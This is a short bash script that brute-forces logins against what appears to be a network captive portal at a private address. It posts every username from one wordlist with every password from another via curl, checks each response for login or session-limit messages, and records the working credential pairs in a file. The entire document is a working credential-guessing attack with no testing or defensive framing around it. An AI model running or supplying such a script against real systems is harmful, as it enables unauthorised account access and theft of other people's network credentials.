i=0
while read x;
do
        
	while read y;
	do	     
	curl -k -d "mode=191&userName=$x&password=$y&btnSubmit=Login" https://10.1.0.10:8090/httpclient.html --retry 3 --speed-limit 5 --speed-time 8 > result.txt
      		echo "ID=$x"
		echo "Current Password=$y"
		echo "Password's found= $i"
	if grep -q 'logged in' "result.txt"; 
        then
		((i++))               
		printf "$x\t$y\n" >> final.txt;
        
        elif grep -q 'Maximum' "result.txt";
        then
		((i++))
            printf "$x\t$y\n" >> final.txt;

        elif grep -q 'exceeded' "result.txt";
        then
		((i++))
            printf "$x\t$y\n" >> final.txt;
        fi

    done < pass.txt
done < id.txt
